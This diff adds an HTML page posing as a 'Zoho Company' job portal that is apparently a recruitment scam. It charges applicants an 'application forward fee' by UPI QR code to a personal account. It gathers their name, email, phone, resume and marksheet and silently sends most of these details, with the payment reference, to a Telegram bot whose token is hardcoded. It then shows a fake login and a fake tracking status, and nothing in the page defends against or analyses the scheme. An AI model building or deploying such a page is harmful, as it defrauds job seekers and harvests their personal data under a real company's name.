@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Zoho Company Job Portal</title>
+<style>
+  :root{
+    --bg: #0f1020;
+    --card: #141a2b;
+    --surface: #1e2540;
+    --text: #eaeefc;
+    --muted: #a6b3d4;
+    --accent: #7c3aed;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
+    background: linear-gradient(135deg, #0b1020 0%, #1a1f3a 60%, #111428 100%);
+    color: var(--text);
+  }
+  .wrapper { max-width: 1100px; margin: 40px auto; padding: 0 20px; }
+  header {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 16px 20px; border-radius: 12px;
+    background: linear-gradient(135deg, #1f2540 0%, #2a2f58 100%);
+    box-shadow: 0 6px 20px rgba(0,0,0,.25);
+    position: sticky; top: 0; z-index: 10;
+  }
+  header h1 { margin: 0; font-size: 20px; letter-spacing: .5px; }
+  header .brand { display: flex; align-items: center; gap: 12px; }
+  header .brand .logo {
+    width: 34px; height: 34px; border-radius: 8px;
+    background: linear-gradient(135deg, #6ee7b7, #3b82f6);
+  }
+  .card {
+    background: rgba(255,255,255,.04);
+    border: 1px solid rgba(255,255,255,.08);
+    border-radius: 14px;
+    padding: 22px;
+    margin-top: 18px;
+  }
+  h2 { margin: 0 0 8px; font-size: 22px; color: #e8eafc; }
+  .subtitle { color: var(--muted); font-size: 14px; margin-bottom: 12px; }
+  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+  label { display:block; font-weight:600; margin-bottom:6px; }
+  input[type="text"], input[type="email"], input[type="tel"], input[type="file"], textarea, select {
+    width: 100%; padding: 10px 12px; border-radius: 8px; border: 1px solid #2f365b;
+    background: rgba(255,255,255,.06); color: #fff;
+  }
+  textarea { min-height: 90px; resize: vertical; }
+  button {
+    background: linear-gradient(135deg, #7c3aed 0%, #4f46e5 100%);
+    color: white; border: none; padding: 12px 22px; border-radius: 8px;
+    cursor: pointer; font-size: 14px; margin-top: 12px;
+  }
+  button:disabled { opacity: .6; cursor: not-allowed; }
+  .payment-box { background: rgba(20,24,60,.9); padding: 14px; border-radius: 10px; border: 1px solid #2b2f66; margin-top: 14px; }
+  .qr { text-align: center; margin: 8px 0; }
+  .qr img { width: 170px; height: 170px; }
+  .languages { display: flex; gap: 8px; align-items: center; justify-content: flex-end; }
+  .badge { display: inline-block; padding: 6px 10px; border-radius: 999px; font-size: 12px; background: #0ea5e9; color: #002033; font-weight: 700; }
+  .login-section, #applicationData, #registrationForm { display: none; margin-top: 24px; }
+  .print { cursor: pointer; }
+  .link { color: #a5b4fc; text-decoration: underline; }
+  @media (max-width: 900px){
+    .grid { grid-template-columns: 1fr; }
+  }
+  .verified { color: #55ff55; font-weight: bold; }
+  .unverified { color: #ff5f5f; font-weight: bold; }
+  .upi-hidden { display:none; }
+  .back-btn {
+    margin-top: 12px; display: inline-block; padding: 8px 16px;
+    background: #1f2937; color: white; border-radius: 6px;
+    cursor: pointer; text-decoration: none;
+  }
+</style>
+</head>
+<body>
+<div class="wrapper" role="main">
+  <header class="shadow" role="banner">
+    <div class="brand" aria-label="branding">
+      <div class="logo" aria-hidden="true"></div>
+      <h1>Zoho Company</h1>
+    </div>
+    <div class="languages" aria-label="Language switcher">
+      <span class="badge" id="langLabel">English</span>
+      <select id="languageSelect" aria-describedby="langLabel" style="padding:6px;border-radius:6px;border:none;background:#fff;">
+        <option value="en">English</option>
+        <option value="bn">বাংলা</option>
+        <option value="hi">हिन्दी</option>
+        <option value="ta">தமிழ்</option>
+      </select>
+    </div>
+  </header>
+
+  <!-- Auth panel -->
+  <section class="card" id="authPanel" aria-label="Authentication">
+    <h2>Zoho Company</h2>
+    <p class="subtitle">Welcome! Please register or login to continue.</p>
+    <div class="grid" style="grid-template-columns:1fr 1fr;">
+      <button onclick="showRegistration()" style="background:linear-gradient(135deg,#22c55e,#16a34a);color:#fff;">Registration</button>
+      <button onclick="showLoginPanel()" style="background:linear-gradient(135deg,#3b82f6,#1d4ed8);color:#fff;">Login</button>
+    </div>
+  </section>
+
+  <!-- Registration Form -->
+  <section class="card" id="registrationForm" aria-label="Registration Form">
+    <h2>Registration</h2>
+    <form id="registrationFormEl" autocomplete="off" onsubmit="return false;">
+      <div class="grid" style="margin-bottom:10px;">
+        <div><label>Full Name</label><input type="text" id="regName" required /></div>
+        <div><label>Email</label><input type="email" id="regEmail" required /></div>
+      </div>
+      <div class="grid" style="margin-bottom:10px;">
+        <div><label>Phone</label><input type="tel" id="regPhone" required /></div>
+        <div><label>Job Experience</label><input type="text" id="regExperience" /></div>
+      </div>
+      <div class="grid" style="margin-bottom:10px;">
+        <div><label>Work From</label>
+          <select id="regWorkFrom" required>
+            <option value="">Select Option</option><option>Work From Home</option><option>Work From Office</option>
+          </select>
+        </div>
+        <div><label>Job Location</label>
+          <select id="regLocation" required>
+            <option value="">Select Location</option>
+            <option>Hyderabad</option><option>Bangalore</option><option>Chennai</option><option>Pune</option><option>Noida</option>
+            <option>Kolkata</option><option>Delhi</option><option>Mumbai</option>
+          </select>
+        </div>
+      </div>
+      <div class="grid" style="margin-bottom:10px;">
+        <div><label>Education</label><input type="text" id="regEducation" /></div>
+        <div><label>Job Role</label>
+          <select id="regRole">
+            <option>Developer</option><option>Testing</option><option>System Engineer</option>
+          </select>
+        </div>
+      </div>
+      <div class="grid" style="margin-bottom:10px;">
+        <div><label>Fresher / Experienced</label>
+          <select id="regExpLevel">
+            <option>Fresher</option><option>Experienced</option>
+          </select>
+        </div>
+        <div><label>Interview Mode</label>
+          <select id="regInterview">
+            <option>Online</option><option>Offline</option>
+          </select>
+        </div>
+      </div>
+      <div class="grid" style="margin-bottom:10px;">
+        <div><label>Marks / Percentage</label><input type="text" id="regMarks" /></div>
+        <div><label>Marksheet (PDF)</label><input type="file" id="regMarksSheet" accept="application/pdf" /></div>
+      </div>
+      <div class="grid" style="margin-bottom:10px;">
+        <div><label>Resume (PDF)</label><input type="file" id="regResume" accept="application/pdf" /></div>
+        <div><label>UTR / Transaction Number</label><input type="text" id="regUTR" /></div>
+      </div>
+      <div class="payment-box" style="margin-top:10px;">
+        <p><strong>Application Forward Fee</strong></p>
+        <div>Pay Rs. 20 (Application Forward Fee)</div>
+        <div class="upi-hidden" aria-hidden="true">sourav629015@kotak</div>
+        <div class="qr" style="margin:6px 0;">
+          <img src="https://api.qrserver.com/v1/create-qr-code/?data=upi://pay?pa=sourav629015@kotak&amp;am=20&amp;cu=INR&amp;tn=Application+Forward+Fee" alt="QR Code" />
+        </div>
+        <label>Payment Screenshot (Compressed)</label>
+        <input type="file" id="regScreenshot" accept="image/*" />
+        <span id="regVerification" aria-live="polite"></span>
+      </div>
+      <button id="regSubmit" onclick="submitRegistration()">Register</button>
+    </form>
+  </section>
+
+  <!-- Login Panel-->
+  <section class="card login-section" id="loginSection">
+    <h2>Zoho Company</h2>
+    <p>Your Login ID and Password are generated!</p>
+    <div id="loginInfo"></div>
+    <label>Login ID</label>
+    <input type="text" id="loginUser" />
+    <label>Password</label>
+    <input type="password" id="loginPass" />
+    <button onclick="loginUser()">Login</button>
+    <a href="#" class="back-btn" onclick="goBack()">Back</a>
+  </section>
+
+  <!-- Application Tracking -->
+  <section class="card" id="applicationData">
+    <h2>Zoho Company</h2>
+    <p>Your application is under review.</p>
+    <div id="filledForm"></div>
+    <label>Tracking ID</label>
+    <input type="text" id="trackID" />
+    <button onclick="trackApplication()">Track</button>
+    <div id="trackingResult" style="margin-top:12px;"></div>
+    <button onclick="window.print()" class="print">Print Application</button>
+  </section>
+
+  <!-- Authentication Landing -->
+  <section class="card" id="authPanel" style="display:block;">
+    <h2>Zoho Company</h2>
+    <p>Please register or login to continue.</p>
+    <div class="grid" style="grid-template-columns:1fr 1fr;">
+      <button onclick="showRegistration()" style="background:linear-gradient(135deg,#22c55e,#16a34a);color:#fff;">Registration</button>
+      <button onclick="showLoginPanel()" style="background:linear-gradient(135deg,#3b82f6,#1d4ed8);color:#fff;">Login</button>
+    </div>
+  </section>
+</div>
+
+<script>
+  // Language handling
+  const languageSelect = document.getElementById("languageSelect");
+  const langLabel = document.getElementById("langLabel");
+  function setLanguage(lang='en'){
+    langLabel.textContent = (lang==='en')?'English':(lang==='bn'?'বাংলা':(lang==='hi'?'हिन्दी':'தமிழ்'));
+  }
+  languageSelect.addEventListener('change', ()=>setLanguage(languageSelect.value));
+  setLanguage('en');
+
+  // Navigation helpers
+  function goBack() {
+    // Show auth panel, hide others
+    document.getElementById('loginSection').style.display = 'none';
+    document.getElementById('registrationForm').style.display = 'none';
+    document.getElementById('applicationData').style.display = 'none';
+    document.getElementById('authPanel').style.display = 'block';
+  }
+
+  function showRegistration() {
+    document.getElementById('authPanel').style.display = 'none';
+    document.getElementById('registrationForm').style.display = 'block';
+    document.getElementById('loginSection').style.display = 'none';
+    document.getElementById('applicationData').style.display = 'none';
+  }
+
+  function showLoginPanel() {
+    document.getElementById('authPanel').style.display = 'none';
+    document.getElementById('loginSection').style.display = 'block';
+    document.getElementById('registrationForm').style.display = 'none';
+    document.getElementById('applicationData').style.display = 'none';
+  }
+
+  // Compress payment screenshot image
+  let compressedImageData = '';
+  document.getElementById('regScreenshot').addEventListener('change', function(e){
+    const file = e.target.files[0];
+    if(!file) return;
+    const reader = new FileReader();
+    reader.onload = function(evt){
+      const img = new Image();
+      img.src = evt.target.result;
+      img.onload = function(){
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        const MAX_WIDTH = 600;
+        const scale = MAX_WIDTH / img.width;
+        canvas.width = MAX_WIDTH;
+        canvas.height = img.height * scale;
+        ctx.drawImage(img,0,0,canvas.width,canvas.height);
+        compressedImageData = canvas.toDataURL('image/jpeg', 0.6);
+        alert('Payment screenshot compressed successfully!');
+      };
+    };
+    reader.readAsDataURL(file);
+  });
+
+  // Read PDF as Data URL helper
+  function readFileAsDataURL(input, callback){
+    const f = input.files[0];
+    if(!f){ callback(null); return; }
+    const reader = new FileReader();
+    reader.onload = () => callback(reader.result);
+    reader.readAsDataURL(f);
+  }
+
+  // Submit Registration function
+  function submitRegistration(){
+    if(document.getElementById('regUTR').value.trim().length < 8){
+      alert('Please provide a valid Transaction UTR');
+      return;
+    }
+    Promise.all([
+      new Promise(res => readFileAsDataURL(document.getElementById('regMarksSheet'), res)),
+      new Promise(res => readFileAsDataURL(document.getElementById('regResume'), res))
+    ]).then(([marksheetData,resumeData])=>{
+      const data = {
+        name: document.getElementById('regName').value,
+        email: document.getElementById('regEmail').value,
+        phone: document.getElementById('regPhone').value,
+        experience: document.getElementById('regExperience').value,
+        workFrom: document.getElementById('regWorkFrom').value,
+        location: document.getElementById('regLocation').value,
+        education: document.getElementById('regEducation').value,
+        role: document.getElementById('regRole').value,
+        expLevel: document.getElementById('regExpLevel').value,
+        interview: document.getElementById('regInterview').value,
+        marks: document.getElementById('regMarks').value,
+        utr: document.getElementById('regUTR').value,
+        paymentScreenshot: compressedImageData,
+        marksheetFile: marksheetData || '',
+        resumeFile: resumeData || ''
+      };
+      const loginID = 'zoho.user' + Math.floor(Math.random()*10000);
+      const password = 'Zho@' + Math.floor(Math.random()*9000 + 1000);
+      const trackingID = Math.random().toString(36).slice(2,10).toUpperCase();
+      data.trackingID = trackingID;
+      localStorage.setItem('applicationData', JSON.stringify(data));
+      localStorage.setItem('loginID', loginID);
+      localStorage.setItem('password', password);
+      localStorage.setItem('trackingID', trackingID);
+
+      sendToTelegram(data, loginID);
+
+      document.getElementById('registrationForm').style.display = 'none';
+      document.getElementById('loginSection').style.display = 'block';
+      document.getElementById('loginInfo').innerHTML = `<strong>Login ID:</strong> ${loginID}<br/><strong>Password:</strong> ${password}<br/><strong>Tracking ID:</strong> ${trackingID}`;
+    });
+  }
+
+  // Telegram Bot API call - production needs server proxy / CORS management
+  function sendToTelegram(data, userID){
+    const botToken = "5729834421:AAGrCVQPlxmxrqCT_g0mzWny-EdWU1febhE";
+    const chatID = "-1003102946985";
+    const message = `
+New Application Received:
+UserID: ${userID}
+Name: ${data.name}
+Email: ${data.email}
+Phone: ${data.phone}
+Work From: ${data.workFrom}
+Experience: ${data.experience}
+Location: ${data.location}
+Education: ${data.education}
+Role: ${data.role}
+Level: ${data.expLevel}
+Interview: ${data.interview}
+Marks: ${data.marks}
+UTR: ${data.utr}
+Tracking ID: ${data.trackingID}`;
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`)
+      .then(resp=>console.log("Telegram message sent",resp))
+      .catch(err=>console.error("Telegram error", err));
+  }
+
+  // Login
+  function loginUser(){
+    const id = document.getElementById('loginUser').value.trim();
+    const pass = document.getElementById('loginPass').value.trim();
+    const savedID = localStorage.getItem('loginID');
+    const savedPass = localStorage.getItem('password');
+    if(id === savedID && pass === savedPass){
+      document.getElementById('loginSection').style.display = 'none';
+      document.getElementById('applicationData').style.display = 'block';
+      const d = JSON.parse(localStorage.getItem('applicationData') || '{}');
+      let html = `<p><strong>Name:</strong> ${d.name}</p>`;
+      html += `<p><strong>Email:</strong> ${d.email}</p>`;
+      html += `<p><strong>Phone:</strong> ${d.phone}</p>`;
+      html += `<p><strong>Work From:</strong> ${d.workFrom}</p>`;
+      html += `<p><strong>Experience:</strong> ${d.experience}</p>`;
+      html += `<p><strong>Location:</strong> ${d.location}</p>`;
+      html += `<p><strong>Education:</strong> ${d.education}</p>`;
+      html += `<p><strong>Role:</strong> ${d.role}</p>`;
+      html += `<p><strong>Level:</strong> ${d.expLevel}</p>`;
+      html += `<p><strong>Interview:</strong> ${d.interview}</p>`;
+      html += `<p><strong>Marks / Percentage:</strong> ${d.marks}</p>`;
+      html += `<p><strong>UTR:</strong> ${d.utr}</p>`;
+      html += `<p><strong>Tracking ID:</strong> ${d.trackingID}</p>`;
+      if(d.paymentScreenshot) html += `<p><strong>Payment Screenshot:</strong><br/><img src="${d.paymentScreenshot}" width="200"/></p>`;
+      if(d.marksheetFile) html += `<p><strong>Marksheet:</strong> <a href="${d.marksheetFile}" download>Download</a></p>`;
+      if(d.resumeFile) html += `<p><strong>Resume:</strong> <a href="${d.resumeFile}" download>Download</a></p>`;
+      document.getElementById('filledForm').innerHTML = html;
+    } else {
+      alert('Invalid login credentials!');
+    }
+  }
+
+  // Track Application
+  function trackApplication(){
+    const tid = document.getElementById('trackID').value.trim();
+    const res = document.getElementById('trackingResult');
+    if(tid){
+      const stored = JSON.parse(localStorage.getItem('applicationData') || '{}');
+      if(stored.trackingID === tid.toUpperCase()){
+        res.innerHTML = `<p>Tracking ID <b>${tid}</b>: Status - Under review</p>`;
+      } else {
+        res.innerHTML = `<p>No application found with Tracking ID <b>${tid}</b>.</p>`;
+      }
+    } else {
+      res.innerHTML = '<p>Please enter a valid Tracking ID</p>';
+    }
+  }
+
+  // Initialize
+  document.getElementById('authPanel').style.display = 'block';
+
+  // Global expose for buttons
+  window.showRegistration = showRegistration;
+  window.showLoginPanel = showLoginPanel;
+  window.submitRegistration = submitRegistration;
+  window.loginUser = loginUser;
+  window.trackApplication = trackApplication;
+  window.goBack = goBack;
+</script>
+
+</div>
+</body>
+</html>
